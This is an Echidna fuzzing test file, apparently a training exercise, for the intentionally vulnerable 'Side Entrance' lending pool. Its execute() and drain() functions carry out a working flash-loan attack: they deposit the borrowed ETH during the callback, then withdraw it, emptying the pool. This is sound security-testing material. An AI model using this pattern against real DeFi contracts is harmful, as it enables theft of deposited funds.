// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

/// @title PoolDeployer - Helper to deploy and seed the pool via deposit()
/// @notice Deploys a SideEntranceLenderPool and funds it using the proper deposit() function
/// @dev EX7-02: Using deposit() to fund the pool ensures the ETH is properly tracked
///      in the pool's internal balance mapping, making the initial state realistic.
contract PoolDeployer {
    /// @notice Deploys a pool and seeds it with the forwarded ETH via deposit()
    /// @dev The pool's internal balance is credited to this deployer contract
    /// @return The freshly funded pool
    function deployNewPool() public payable returns (SideEntranceLenderPool) {
        SideEntranceLenderPool pool = new SideEntranceLenderPool();
        pool.deposit{value: msg.value}();
        return pool;
    }
}

/// @title SideEntranceEchidna - Echidna Exercise 7: Side Entrance Lender Pool
/// @author Trail of Bits / Damn Vulnerable DeFi (Echidna Exercise)
/// @notice Tests that the pool's ETH balance cannot be drained.
/// @dev EX7-02: Setup: Pool is funded with 1000 ETH via deposit().
///      The bug: A flash loan borrower can deposit() the borrowed ETH during execute(),
///      which satisfies the repayment check while crediting the borrower's internal balance.
///      After the flash loan, the borrower calls withdraw() to steal the funds.
///      Fix: Add a reentrancy lock that prevents deposit() during flash loan execution,
///      or track flash loan repayments separately from regular deposits.
contract SideEntranceEchidna is IFlashLoanEtherReceiver {
    /// @notice The lending pool instance
    SideEntranceLenderPool pool;

    /// @notice The pool's initial balance (1000 ETH)
    uint256 initialPoolBalance;

    /// @notice Sets up the test environment with a funded pool
    /// @dev EX7-02: Uses PoolDeployer to fund the pool properly via deposit()
    ///      so that the ETH is tracked in the pool's internal balances mapping.
    constructor() payable {

        PoolDeployer deployer = new PoolDeployer();
        pool = deployer.deployNewPool{value: 1000 ether}();

        initialPoolBalance = address(pool).balance;
    }

    /// @notice Flash loan callback - executes the exploit strategy
    /// @dev EX7-02: Deposits the borrowed ETH back into the pool during the callback.
    ///      This satisfies the balance check but credits our internal balance.
    function execute() external payable override {
        // EX7-02: Deposit borrowed ETH - satisfies repayment but gives us balance credit
        pool.deposit{value: msg.value}();
    }

    /// @notice Initiates a flash loan from the pool — callable by Echidna EOA senders
    /// @dev EX7-02: Exposes the flash loan entry point so Echidna can originate the
    ///      callback-based exploit (pool calls execute() on this contract during the loan).
    ///      Without this function the fuzzer cannot drive the vulnerable execution path.
    /// @param _amount The amount of ETH to flash-loan from the pool
    function flashLoan(uint256 _amount) public {
        pool.flashLoan(_amount);
    }

    /// @notice Withdraws credited balance from the pool — callable by Echidna EOA senders
    /// @dev EX7-02: After the flash loan deposits ETH back via execute(), this contract
    ///      has an internal credit in the pool. Calling drain() extracts those funds,
    ///      completing the exploit and causing the property to fail.
    function drain() public {
        pool.withdraw();
    }

    /// @notice Allows this contract to receive ETH (needed for withdraw)
    receive() external payable {}

    /// @notice Echidna property: pool balance should not decrease
    /// @dev EX7-02: This will FAIL because the flash loan + deposit + withdraw attack
    ///      allows draining the entire pool balance.
    /// @return true if pool balance is preserved, false if drained
    function echidna_test_pool_balance() public view returns (bool) {
        return address(pool).balance >= initialPoolBalance;
    }
}
